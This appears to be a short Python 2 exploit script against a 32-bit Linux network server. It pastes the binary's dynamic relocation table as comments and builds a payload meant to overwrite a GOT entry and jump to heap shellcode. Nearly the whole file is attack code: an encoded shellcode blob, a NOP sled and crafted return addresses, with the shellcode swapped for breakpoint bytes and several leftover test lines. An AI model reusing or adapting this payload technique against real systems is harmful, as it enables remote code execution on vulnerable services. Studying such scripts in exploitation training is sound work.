#!/usr/bin/env python
#enter 49 when prompted
#0804b038 R_386_JUMP_SLOT   exit@GLIBC_2.0
#0804b034 R_386_JUMP_SLOT   puts@GLIBC_2.0
# 0x804c020 heap shellcode
# 0x804c120

#DYNAMIC RELOCATION RECORDS
#OFFSET   TYPE              VALUE 
#0804affc R_386_GLOB_DAT    __gmon_start__
#0804b00c R_386_JUMP_SLOT   read@GLIBC_2.0
#0804b010 R_386_JUMP_SLOT   printf@GLIBC_2.0
#0804b014 R_386_JUMP_SLOT   bzero@GLIBC_2.0
#0804b018 R_386_JUMP_SLOT   inet_ntoa@GLIBC_2.0
#0804b01c R_386_JUMP_SLOT   htons@GLIBC_2.0
#0804b020 R_386_JUMP_SLOT   perror@GLIBC_2.0
#0804b024 R_386_JUMP_SLOT   accept@GLIBC_2.0
#0804b028 R_386_JUMP_SLOT   strcat@GLIBC_2.0
#0804b02c R_386_JUMP_SLOT   strcpy@GLIBC_2.0
#0804b030 R_386_JUMP_SLOT   malloc@GLIBC_2.0
#0804b034 R_386_JUMP_SLOT   puts@GLIBC_2.0
#0804b038 R_386_JUMP_SLOT   exit@GLIBC_2.0
#0804b03c R_386_JUMP_SLOT   strchr@GLIBC_2.0
#0804b040 R_386_JUMP_SLOT   strlen@GLIBC_2.0
#0804b044 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
#0804b048 R_386_JUMP_SLOT   write@GLIBC_2.0
#0804b04c R_386_JUMP_SLOT   bind@GLIBC_2.0
#0804b050 R_386_JUMP_SLOT   strncpy@GLIBC_2.0
#0804b054 R_386_JUMP_SLOT   listen@GLIBC_2.0
#0804b058 R_386_JUMP_SLOT   ntohs@GLIBC_2.0
#0804b05c R_386_JUMP_SLOT   sprintf@GLIBC_2.0
#0804b060 R_386_JUMP_SLOT   atoi@GLIBC_2.0
#0804b064 R_386_JUMP_SLOT   socket@GLIBC_2.0
#0804b068 R_386_JUMP_SLOT   close@GLIBC_2.0

n = 552

shellcode = ""
shellcode += "\xba\x81\x3c\x36\x24\xd9\xeb\xd9\x74\x24\xf4\x5b\x33"
shellcode += "\xc9\xb1\x14\x31\x53\x14\x83\xeb\xfc\x03\x53\x10\x63"
shellcode += "\xc9\x07\xff\x94\xd1\x3b\xbc\x09\x7c\xbe\xcb\x4c\x30"
shellcode += "\xd8\x06\x0e\x6a\x7b\xcb\x66\x8f\x83\xfa\x2a\xe5\x93"
shellcode += "\xad\x82\x70\x72\x27\x44\xdb\xb8\x38\x01\x9a\x46\x8a"
shellcode += "\x15\xad\x21\x21\x95\x8e\x1d\xdf\x58\x90\xcd\x79\x08"
shellcode += "\xae\xa9\xb4\x4c\x99\x30\xbf\x24\x35\xec\x4c\xdc\x21"
shellcode += "\xdd\xd0\x75\xdc\xa8\xf6\xd5\x73\x22\x19\x65\x78\xf9"
shellcode += "\x5a\x90\x90\x90"

shellcode = '\xcc' * len(shellcode)
shellcode_addr = '\x10\xb0\x04\x08'
shellcode_addr = '\x10\xb0\x04\x08'

nopsled = '\x90' * (n - len(shellcode) - len(shellcode_addr))

#target = '\x38\xb0\x04\x08' * (n - len(shellcode) - len(nopsled))
exit_addr = '\x34\xb0\x04\x08'
exit_addr = '1234'
##target ='BBBB'
#target = '\x1c\xa0\x04\x08'
#print filler + target + ' ' + eip
#print target + nopsled + shellcode_addr + shellcode
print shellcode_addr + nopsled + shellcode + exit_addr
